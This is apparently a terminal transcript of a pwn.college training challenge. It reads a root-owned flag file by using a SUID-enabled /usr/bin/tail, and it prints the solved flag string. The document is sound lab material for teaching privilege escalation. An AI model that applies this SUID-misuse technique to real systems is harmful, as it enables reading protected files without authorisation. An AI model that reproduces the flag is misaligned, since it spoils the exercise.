```bash
hacker@program-misuse-level-4:~$ cd /
hacker@program-misuse-level-4:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-4:/$ cat flag
cat: flag: Permission denied
hacker@program-misuse-level-4:/$ cd challenge/
hacker@program-misuse-level-4:/challenge$ ls
babysuid_level4
hacker@program-misuse-level-4:/challenge$ ./babysuid_level4 
Welcome to ./babysuid_level4!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/tail.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/tail!
hacker@program-misuse-level-4:/challenge$ ls -l /usr/bin/tail
-rwsr-xr-x 1 root root 72088 Sep  5  2019 /usr/bin/tail
hacker@program-misuse-level-4:/challenge$ tail /flag
pwn.college{svWF4ey25eBlQzU7xi041iQwSoP.0lN0EDL0AjNzQzW}
hacker@program-misuse-level-4:/challenge$ 
```